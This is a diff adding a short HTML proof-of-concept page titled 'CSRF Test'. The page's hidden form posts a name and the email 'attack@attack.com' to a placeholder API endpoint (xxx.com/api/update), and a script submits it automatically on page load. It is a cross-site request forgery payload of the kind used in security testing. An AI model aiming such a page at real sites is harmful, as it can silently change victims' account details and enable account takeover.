@@ -1,0 +1,15 @@
+
+<html>
+<head>
+    <title>CSRF Test</title>
+</head>
+<body>
+    <form method="POST" action="http://xxx.com/api/update">
+　　　　　　　　<input type="hidden" name="name" value="test">
+　　　　　　　　<input type="hidden" name="email" value="attack@attack.com">
+　　　</form>
+</body>
+<script type="text/javascript" >
+    document.forms[0].submit()
+</script>
+</html>
